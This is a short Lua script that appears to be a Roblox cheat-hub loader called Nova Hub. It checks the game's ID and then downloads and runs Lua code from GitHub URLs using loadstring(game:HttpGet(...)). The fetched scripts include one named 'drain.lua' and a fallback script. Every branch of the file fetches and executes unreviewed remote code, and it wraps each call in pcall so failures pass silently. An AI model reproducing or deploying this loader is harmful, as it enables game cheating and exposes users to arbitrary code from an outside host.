print("Nova Hub Loaded Successfully")
local GAME1 = 10267363348
local SCRIPT_URL1 = "https://raw.githubusercontent.com/NovaHubRBLX/NovaHub/refs/heads/main/drain.lua"
local GAME2 = 9330616906
local SCRIPT_URL2 = "https://raw.githubusercontent.com/NovaHubRBLX/NovaHub/refs/heads/main/fishbaitEvent.lua"

if game.GameId == GAME1 then
   
    local success, result = pcall(function()
        return loadstring(game:HttpGet(SCRIPT_URL1))()
    end)
   
 elseif  game.GameId == GAME2 then
   local success, result = pcall(function()
        return loadstring(game:HttpGet(SCRIPT_URL2))()
    end)
   
else
     local success, result = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/NovaHubRBLX/NovaHub/refs/heads/main/notsupported.lua"))()
    end)
end

